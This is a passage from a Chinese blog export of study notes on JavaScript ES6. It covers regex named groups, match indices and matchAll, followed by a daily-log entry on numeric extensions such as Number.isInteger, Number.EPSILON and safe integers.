<p>上面代码中，“具名组匹配”在圆括号内部，模式的头部添加“问号 + 尖括号 + 组名”（<code>?&lt;year&gt;</code>），然后就可以在<code>exec</code>方法返回结果的<code>groups</code>属性上引用该组名。同时，数字序号（<code>matchObj[1]</code>）依然有效。</p>
<p>具名组匹配等于为每一组匹配加上了 ID，便于描述匹配的目的。如果组的顺序变了，也不用改变匹配后的处理代码。</p>
<p>如果具名组没有匹配，那么对应的<code>groups</code>对象属性会是<code>undefined</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> RE_OPT_A = <span class="regexp">/^(?&lt;as&gt;a+)?$/</span>;</span><br><span class="line"><span class="keyword">const</span> matchObj = RE_OPT_A.exec(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">matchObj.groups.as <span class="comment">// undefined</span></span><br><span class="line"><span class="string">&#x27;as&#x27;</span> <span class="keyword">in</span> matchObj.groups <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，具名组<code>as</code>没有找到匹配，那么<code>matchObj.groups.as</code>属性值就是<code>undefined</code>，并且<code>as</code>这个键名在<code>groups</code>是始终存在的。</p>
<h5 id="6-12-2-解构赋值和替换"><a href="#6-12-2-解构赋值和替换" class="headerlink" title="6.12.2 解构赋值和替换"></a>6.12.2 解构赋值和替换</h5><p>有了具名组匹配以后，可以使用解构赋值直接从匹配结果上为变量赋值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;<span class="attr">groups</span>: &#123;one, two&#125;&#125; = <span class="regexp">/^(?&lt;one&gt;.*):(?&lt;two&gt;.*)$/u</span>.exec(<span class="string">&#x27;foo:bar&#x27;</span>);</span><br><span class="line">one  <span class="comment">// foo</span></span><br><span class="line">two  <span class="comment">// bar</span></span><br></pre></td></tr></table></figure>
<p>字符串替换时，使用<code>$&lt;组名&gt;</code>引用具名组。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> re = <span class="regexp">/(?&lt;year&gt;\d&#123;4&#125;)-(?&lt;month&gt;\d&#123;2&#125;)-(?&lt;day&gt;\d&#123;2&#125;)/u</span>;</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;2015-01-02&#x27;</span>.replace(re, <span class="string">&#x27;$&lt;day&gt;/$&lt;month&gt;/$&lt;year&gt;&#x27;</span>)</span><br><span class="line"><span class="comment">// &#x27;02/01/2015&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>replace</code>方法的第二个参数是一个字符串，而不是正则表达式。</p>
<p><code>replace</code>方法的第二个参数也可以是函数，该函数的参数序列如下。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;2015-01-02&#x27;</span>.replace(re, (</span><br><span class="line">   matched, <span class="comment">// 整个匹配结果 2015-01-02</span></span><br><span class="line">   capture1, <span class="comment">// 第一个组匹配 2015</span></span><br><span class="line">   capture2, <span class="comment">// 第二个组匹配 01</span></span><br><span class="line">   capture3, <span class="comment">// 第三个组匹配 02</span></span><br><span class="line">   position, <span class="comment">// 匹配开始的位置 0</span></span><br><span class="line">   S, <span class="comment">// 原字符串 2015-01-02</span></span><br><span class="line">   groups <span class="comment">// 具名组构成的一个对象 &#123;year, month, day&#125;</span></span><br><span class="line"> ) =&gt; &#123;</span><br><span class="line"> <span class="keyword">let</span> &#123;day, month, year&#125; = groups;</span><br><span class="line"> <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;day&#125;</span>/<span class="subst">$&#123;month&#125;</span>/<span class="subst">$&#123;year&#125;</span>`</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>具名组匹配在原来的基础上，新增了最后一个函数参数：具名组构成的一个对象。函数内部可以直接对这个对象进行解构赋值。</p>
<h5 id="6-12-3-引用"><a href="#6-12-3-引用" class="headerlink" title="6.12.3 引用"></a>6.12.3 引用</h5><p>如果要在正则表达式内部引用某个“具名组匹配”，可以使用<code>\k&lt;组名&gt;</code>的写法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> RE_TWICE = <span class="regexp">/^(?&lt;word&gt;[a-z]+)!\k&lt;word&gt;$/</span>;</span><br><span class="line">RE_TWICE.test(<span class="string">&#x27;abc!abc&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">RE_TWICE.test(<span class="string">&#x27;abc!ab&#x27;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>数字引用（<code>\1</code>）依然有效。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> RE_TWICE = <span class="regexp">/^(?&lt;word&gt;[a-z]+)!\1$/</span>;</span><br><span class="line">RE_TWICE.test(<span class="string">&#x27;abc!abc&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">RE_TWICE.test(<span class="string">&#x27;abc!ab&#x27;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>这两种引用语法还可以同时使用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> RE_TWICE = <span class="regexp">/^(?&lt;word&gt;[a-z]+)!\k&lt;word&gt;!\1$/</span>;</span><br><span class="line">RE_TWICE.test(<span class="string">&#x27;abc!abc!abc&#x27;</span>) <span class="comment">// true</span></span><br><span class="line">RE_TWICE.test(<span class="string">&#x27;abc!abc!ab&#x27;</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h4 id="6-13-正则匹配索引"><a href="#6-13-正则匹配索引" class="headerlink" title="6.13 正则匹配索引"></a>6.13 正则匹配索引</h4><p>正则匹配结果的开始位置和结束位置，目前获取并不是很方便。正则实例的<code>exec()</code>方法，返回结果有一个<code>index</code>属性，可以获取整个匹配结果的开始位置，但是如果包含组匹配，每个组匹配的开始位置，很难拿到。</p>
<p>现在有一个第三阶段提案，为<code>exec()</code>方法的返回结果加上<code>indices</code>属性，在这个属性上面可以拿到匹配的开始位置和结束位置。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> text = <span class="string">&#x27;zabbcdef&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> re = <span class="regexp">/ab/</span>;</span><br><span class="line"><span class="keyword">const</span> result = re.exec(text);</span><br><span class="line"></span><br><span class="line">result.index <span class="comment">// 1</span></span><br><span class="line">result.indices <span class="comment">// [ [1, 3] ]</span></span><br></pre></td></tr></table></figure>
<p>上面例子中，<code>exec()</code>方法的返回结果<code>result</code>，它的<code>index</code>属性是整个匹配结果（<code>ab</code>）的开始位置，而它的<code>indices</code>属性是一个数组，成员是每个匹配的开始位置和结束位置的数组。由于该例子的正则表达式没有组匹配，所以<code>indices</code>数组只有一个成员，表示整个匹配的开始位置是<code>1</code>，结束位置是<code>3</code>。</p>
<p>注意，开始位置包含在匹配结果之中，但是结束位置不包含在匹配结果之中。比如，匹配结果为<code>ab</code>，分别是原始字符串的第1位和第2位，那么结束位置就是第3位。</p>
<p>如果正则表达式包含组匹配，那么<code>indices</code>属性对应的数组就会包含多个成员，提供每个组匹配的开始位置和结束位置。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> text = <span class="string">&#x27;zabbcdef&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> re = <span class="regexp">/ab+(cd)/</span>;</span><br><span class="line"><span class="keyword">const</span> result = re.exec(text);</span><br><span class="line"></span><br><span class="line">result.indices <span class="comment">// [ [ 1, 6 ], [ 4, 6 ] ]</span></span><br></pre></td></tr></table></figure>
<p>上面例子中，正则表达式包含一个组匹配，那么<code>indices</code>属性数组就有两个成员，第一个成员是整个匹配结果（<code>abbcd</code>）的开始位置和结束位置，第二个成员是组匹配（<code>cd</code>）的开始位置和结束位置。</p>
<p>下面是多个组匹配的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> text = <span class="string">&#x27;zabbcdef&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> re = <span class="regexp">/ab+(cd(ef))/</span>;</span><br><span class="line"><span class="keyword">const</span> result = re.exec(text);</span><br><span class="line"></span><br><span class="line">result.indices <span class="comment">// [ [1, 8], [4, 8], [6, 8] ]</span></span><br></pre></td></tr></table></figure>
<p>上面例子中，正则表达式包含两个组匹配，所以<code>indices</code>属性数组就有三个成员。</p>
<p>如果正则表达式包含具名组匹配，<code>indices</code>属性数组还会有一个<code>groups</code>属性。该属性是一个对象，可以从该对象获取具名组匹配的开始位置和结束位置。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> text = <span class="string">&#x27;zabbcdef&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> re = <span class="regexp">/ab+(?&lt;Z&gt;cd)/</span>;</span><br><span class="line"><span class="keyword">const</span> result = re.exec(text);</span><br><span class="line"></span><br><span class="line">result.indices.groups <span class="comment">// &#123; Z: [ 4, 6 ] &#125;</span></span><br></pre></td></tr></table></figure>
<p>上面例子中，<code>exec()</code>方法返回结果的<code>indices.groups</code>属性是一个对象，提供具名组匹配<code>Z</code>的开始位置和结束位置。</p>
<p>如果获取组匹配不成功，<code>indices</code>属性数组的对应成员则为<code>undefined</code>，<code>indices.groups</code>属性对象的对应成员也是<code>undefined</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> text = <span class="string">&#x27;zabbcdef&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> re = <span class="regexp">/ab+(?&lt;Z&gt;ce)?/</span>;</span><br><span class="line"><span class="keyword">const</span> result = re.exec(text);</span><br><span class="line"></span><br><span class="line">result.indices[<span class="number">1</span>] <span class="comment">// undefined</span></span><br><span class="line">result.indices.groups[<span class="string">&#x27;Z&#x27;</span>] <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>
<p>上面例子中，由于组匹配不成功，所以<code>indices</code>属性数组和<code>indices.groups</code>属性对象对应的组匹配成员都是<code>undefined</code>。</p>
<h4 id="6-14-String-prototype-matchAll"><a href="#6-14-String-prototype-matchAll" class="headerlink" title="6.14 String.prototype.matchAll()"></a>6.14 String.prototype.matchAll()</h4><p>如果一个正则表达式在字符串里面有多个匹配，现在一般使用<code>g</code>修饰符或<code>y</code>修饰符，在循环里面逐一取出。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> regex = <span class="regexp">/t(e)(st(\d?))/g</span>;</span><br><span class="line"><span class="keyword">var</span> string = <span class="string">&#x27;test1test2test3&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> matches = [];</span><br><span class="line"><span class="keyword">var</span> match;</span><br><span class="line"><span class="keyword">while</span> (match = regex.exec(string)) &#123;</span><br><span class="line">  matches.push(match);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">matches</span><br><span class="line"><span class="comment">// [</span></span><br><span class="line"><span class="comment">//   [&quot;test1&quot;, &quot;e&quot;, &quot;st1&quot;, &quot;1&quot;, index: 0, input: &quot;test1test2test3&quot;],</span></span><br><span class="line"><span class="comment">//   [&quot;test2&quot;, &quot;e&quot;, &quot;st2&quot;, &quot;2&quot;, index: 5, input: &quot;test1test2test3&quot;],</span></span><br><span class="line"><span class="comment">//   [&quot;test3&quot;, &quot;e&quot;, &quot;st3&quot;, &quot;3&quot;, index: 10, input: &quot;test1test2test3&quot;]</span></span><br><span class="line"><span class="comment">// ]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>while</code>循环取出每一轮的正则匹配，一共三轮。</p>
<p>ES2020 增加了<code>String.prototype.matchAll()</code>方法，可以一次性取出所有匹配。不过，它返回的是一个遍历器（Iterator），而不是数组。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> string = <span class="string">&#x27;test1test2test3&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> regex = <span class="regexp">/t(e)(st(\d?))/g</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> match <span class="keyword">of</span> string.matchAll(regex)) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(match);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// [&quot;test1&quot;, &quot;e&quot;, &quot;st1&quot;, &quot;1&quot;, index: 0, input: &quot;test1test2test3&quot;]</span></span><br><span class="line"><span class="comment">// [&quot;test2&quot;, &quot;e&quot;, &quot;st2&quot;, &quot;2&quot;, index: 5, input: &quot;test1test2test3&quot;]</span></span><br><span class="line"><span class="comment">// [&quot;test3&quot;, &quot;e&quot;, &quot;st3&quot;, &quot;3&quot;, index: 10, input: &quot;test1test2test3&quot;]</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，由于<code>string.matchAll(regex)</code>返回的是遍历器，所以可以用<code>for...of</code>循环取出。相对于返回数组，返回遍历器的好处在于，如果匹配结果是一个很大的数组，那么遍历器比较节省资源。</p>
<p>遍历器转为数组是非常简单的，使用<code>...</code>运算符和<code>Array.from()</code>方法就可以了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 转为数组的方法一</span></span><br><span class="line">[...string.matchAll(regex)]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转为数组的方法二</span></span><br><span class="line"><span class="built_in">Array</span>.from(string.matchAll(regex))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JS-ES6</category>
      </categories>
      <tags>
        <tag>JS-ES6 正则的扩展</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0077</title>
    <url>/2021/06/25/%E6%89%93%E5%8D%A10077/</url>
    <content><![CDATA[<p><font color=#78cdd1>hi,我的剑已出鞘，想和你过过招。</font></p>
<h2 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h2><h3 id="7-数值的扩展"><a href="#7-数值的扩展" class="headerlink" title="7.数值的扩展"></a>7.数值的扩展</h3><h4 id="7-1-二进制和八进制表示法"><a href="#7-1-二进制和八进制表示法" class="headerlink" title="7.1 二进制和八进制表示法"></a>7.1 二进制和八进制表示法</h4><p>ES6 提供了二进制和八进制数值的新的写法，分别用前缀<code>0b</code>（或<code>0B</code>）和<code>0o</code>（或<code>0O</code>）表示。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">0b111110111</span> === <span class="number">503</span> <span class="comment">// true</span></span><br><span class="line"><span class="number">0o767</span> === <span class="number">503</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>从 ES5 开始，在严格模式之中，八进制就不再允许使用前缀<code>0</code>表示，ES6 进一步明确，要使用前缀<code>0o</code>表示。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 非严格模式</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">0o11</span> === <span class="number">011</span>);</span><br><span class="line">&#125;)() <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 严格模式</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="meta">  &#x27;use strict&#x27;</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="number">0o11</span> === <span class="number">011</span>);</span><br><span class="line">&#125;)() <span class="comment">// Uncaught SyntaxError: Octal literals are not allowed in strict mode.</span></span><br></pre></td></tr></table></figure>
<p>如果要将<code>0b</code>和<code>0o</code>前缀的字符串数值转为十进制，要使用<code>Number</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>(<span class="string">&#x27;0b111&#x27;</span>)  <span class="comment">// 7</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="string">&#x27;0o10&#x27;</span>)  <span class="comment">// 8</span></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h4 id="7-2-Number-isFinite-Number-isNaN"><a href="#7-2-Number-isFinite-Number-isNaN" class="headerlink" title="7.2 Number.isFinite(), Number.isNaN()"></a>7.2 Number.isFinite(), Number.isNaN()</h4><p>ES6 在<code>Number</code>对象上，新提供了<code>Number.isFinite()</code>和<code>Number.isNaN()</code>两个方法。</p>
<p><code>Number.isFinite()</code>用来检查一个数值是否为有限的（finite），即不是<code>Infinity</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.isFinite(<span class="number">15</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>.isFinite(<span class="number">0.8</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>.isFinite(<span class="literal">NaN</span>); <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Number</span>.isFinite(<span class="literal">Infinity</span>); <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Number</span>.isFinite(-<span class="literal">Infinity</span>); <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Number</span>.isFinite(<span class="string">&#x27;foo&#x27;</span>); <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Number</span>.isFinite(<span class="string">&#x27;15&#x27;</span>); <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Number</span>.isFinite(<span class="literal">true</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>注意，如果参数类型不是数值，<code>Number.isFinite</code>一律返回<code>false</code>。</p>
<p><code>Number.isNaN()</code>用来检查一个值是否为<code>NaN</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.isNaN(<span class="literal">NaN</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>.isNaN(<span class="number">15</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Number</span>.isNaN(<span class="string">&#x27;15&#x27;</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Number</span>.isNaN(<span class="literal">true</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Number</span>.isNaN(<span class="number">9</span>/<span class="literal">NaN</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>.isNaN(<span class="string">&#x27;true&#x27;</span> / <span class="number">0</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>.isNaN(<span class="string">&#x27;true&#x27;</span> / <span class="string">&#x27;true&#x27;</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>如果参数类型不是<code>NaN</code>，<code>Number.isNaN</code>一律返回<code>false</code>。</p>
<p>它们与传统的全局方法<code>isFinite()</code>和<code>isNaN()</code>的区别在于，传统方法先调用<code>Number()</code>将非数值的值转为数值，再进行判断，而这两个新方法只对数值有效，<code>Number.isFinite()</code>对于非数值一律返回<code>false</code>,<code>Number.isNaN()</code>只有对于<code>NaN</code>才返回<code>true</code>，非<code>NaN</code>一律返回<code>false</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">isFinite</span>(<span class="number">25</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">isFinite</span>(<span class="string">&quot;25&quot;</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>.isFinite(<span class="number">25</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>.isFinite(<span class="string">&quot;25&quot;</span>) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">isNaN</span>(<span class="literal">NaN</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">isNaN</span>(<span class="string">&quot;NaN&quot;</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>.isNaN(<span class="literal">NaN</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>.isNaN(<span class="string">&quot;NaN&quot;</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Number</span>.isNaN(<span class="number">1</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<h4 id="7-3-Number-parseInt-Number-parseFloat"><a href="#7-3-Number-parseInt-Number-parseFloat" class="headerlink" title="7.3 Number.parseInt(), Number.parseFloat()"></a>7.3 Number.parseInt(), Number.parseFloat()</h4><p>ES6 将全局方法<code>parseInt()</code>和<code>parseFloat()</code>，移植到<code>Number</code>对象上面，行为完全保持不变。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES5的写法</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;12.34&#x27;</span>) <span class="comment">// 12</span></span><br><span class="line"><span class="built_in">parseFloat</span>(<span class="string">&#x27;123.45#&#x27;</span>) <span class="comment">// 123.45</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6的写法</span></span><br><span class="line"><span class="built_in">Number</span>.parseInt(<span class="string">&#x27;12.34&#x27;</span>) <span class="comment">// 12</span></span><br><span class="line"><span class="built_in">Number</span>.parseFloat(<span class="string">&#x27;123.45#&#x27;</span>) <span class="comment">// 123.45</span></span><br></pre></td></tr></table></figure>
<p>这样做的目的，是逐步减少全局性方法，使得语言逐步模块化。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.parseInt === <span class="built_in">parseInt</span> <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>.parseFloat === <span class="built_in">parseFloat</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h4 id="7-4-Number-isInteger"><a href="#7-4-Number-isInteger" class="headerlink" title="7.4 Number.isInteger()"></a>7.4 Number.isInteger()</h4><p><code>Number.isInteger()</code>用来判断一个数值是否为整数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.isInteger(<span class="number">25</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>.isInteger(<span class="number">25.1</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>JavaScript 内部，整数和浮点数采用的是同样的储存方法，所以 25 和 25.0 被视为同一个值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.isInteger(<span class="number">25</span>) <span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>.isInteger(<span class="number">25.0</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>如果参数不是数值，<code>Number.isInteger</code>返回<code>false</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.isInteger() <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Number</span>.isInteger(<span class="literal">null</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Number</span>.isInteger(<span class="string">&#x27;15&#x27;</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Number</span>.isInteger(<span class="literal">true</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>注意，由于 JavaScript 采用 IEEE 754 标准，数值存储为64位双精度格式，数值精度最多可以达到 53 个二进制位（1 个隐藏位与 52 个有效位）。如果数值的精度超过这个限度，第54位及后面的位就会被丢弃，这种情况下，<code>Number.isInteger</code>可能会误判。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.isInteger(<span class="number">3.0000000000000002</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>Number.isInteger</code>的参数明明不是整数，但是会返回<code>true</code>。原因就是这个小数的精度达到了小数点后16个十进制位，转成二进制位超过了53个二进制位，导致最后的那个<code>2</code>被丢弃了。</p>
<p>类似的情况还有，如果一个数值的绝对值小于<code>Number.MIN_VALUE</code>（5E-324），即小于 JavaScript 能够分辨的最小值，会被自动转为 0。这时，<code>Number.isInteger</code>也会误判。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.isInteger(<span class="number">5E-324</span>) <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Number</span>.isInteger(<span class="number">5E-325</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>5E-325</code>由于值太小，会被自动转为0，因此返回<code>true</code>。</p>
<p>总之，如果对数据精度的要求较高，不建议使用<code>Number.isInteger()</code>判断一个数值是否为整数。</p>
<h4 id="7-5-Number-EPSILON"><a href="#7-5-Number-EPSILON" class="headerlink" title="7.5 Number.EPSILON"></a>7.5 Number.EPSILON</h4><p>ES6 在<code>Number</code>对象上面，新增一个极小的常量<code>Number.EPSILON</code>。根据规格，它表示 1 与大于 1 的最小浮点数之间的差。</p>
<p>对于 64 位浮点数来说，大于 1 的最小浮点数相当于二进制的<code>1.00..001</code>，小数点后面有连续 51 个零。这个值减去 1 之后，就等于 2 的 -52 次方。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Number</span>.EPSILON === <span class="built_in">Math</span>.pow(<span class="number">2</span>, -<span class="number">52</span>)</span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="built_in">Number</span>.EPSILON</span><br><span class="line"><span class="comment">// 2.220446049250313e-16</span></span><br><span class="line"><span class="built_in">Number</span>.EPSILON.toFixed(<span class="number">20</span>)</span><br><span class="line"><span class="comment">// &quot;0.00000000000000022204&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>Number.EPSILON</code>实际上是 JavaScript 能够表示的最小精度。误差如果小于这个值，就可以认为已经没有意义了，即不存在误差了。</p>
<p>引入一个这么小的量的目的，在于为浮点数计算，设置一个误差范围。我们知道浮点数计算是不精确的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">0.1</span> + <span class="number">0.2</span></span><br><span class="line"><span class="comment">// 0.30000000000000004</span></span><br><span class="line"></span><br><span class="line"><span class="number">0.1</span> + <span class="number">0.2</span> - <span class="number">0.3</span></span><br><span class="line"><span class="comment">// 5.551115123125783e-17</span></span><br><span class="line"></span><br><span class="line"><span class="number">5.551115123125783e-17</span>.toFixed(<span class="number">20</span>)</span><br><span class="line"><span class="comment">// &#x27;0.00000000000000005551&#x27;</span></span><br></pre></td></tr></table></figure>
<p>上面代码解释了，为什么比较<code>0.1 + 0.2</code>与<code>0.3</code>得到的结果是<code>false</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">0.1</span> + <span class="number">0.2</span> === <span class="number">0.3</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p><code>Number.EPSILON</code>可以用来设置“能够接受的误差范围”。比如，误差范围设为 2 的-50 次方（即<code>Number.EPSILON * Math.pow(2, 2)</code>），即如果两个浮点数的差小于这个值，我们就认为这两个浮点数相等。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">5.551115123125783e-17</span> &lt; <span class="built_in">Number</span>.EPSILON * <span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>因此，<code>Number.EPSILON</code>的实质是一个可以接受的最小误差范围。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withinErrorMargin</span> (<span class="params">left, right</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Math</span>.abs(left - right) &lt; <span class="built_in">Number</span>.EPSILON * <span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">0.1</span> + <span class="number">0.2</span> === <span class="number">0.3</span> <span class="comment">// false</span></span><br><span class="line">withinErrorMargin(<span class="number">0.1</span> + <span class="number">0.2</span>, <span class="number">0.3</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="number">1.1</span> + <span class="number">1.3</span> === <span class="number">2.4</span> <span class="comment">// false</span></span><br><span class="line">withinErrorMargin(<span class="number">1.1</span> + <span class="number">1.3</span>, <span class="number">2.4</span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面的代码为浮点数运算，部署了一个误差检查函数。</p>
<h4 id="7-6-安全整数和-Number-isSafeInteger"><a href="#7-6-安全整数和-Number-isSafeInteger" class="headerlink" title="7.6 安全整数和 Number.isSafeInteger()"></a>7.6 安全整数和 Number.isSafeInteger()</h4><p>JavaScript 能够准确表示的整数范围在<code>-2^53</code>到<code>2^53</code>之间（不含两个端点），超过这个范围，无法精确表示这个值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">53</span>) <span class="comment">// 9007199254740992</span></span><br><span class="line"></span><br><span class="line"><span class="number">9007199254740992</span>  <span class="comment">// 9007199254740992</span></span><br><span class="line"><span class="number">9007199254740993</span>  <span class="comment">// 9007199254740992</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">53</span>) === <span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">53</span>) + <span class="number">1</span></span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，超出 2 的 53 次方之后，一个数就不精确了。</p>
<p>ES6 引入了<code>Number.MAX_SAFE_INTEGER</code>和<code>Number.MIN_SAFE_INTEGER</code>这两个常量，用来表示这个范围的上下限。</p>
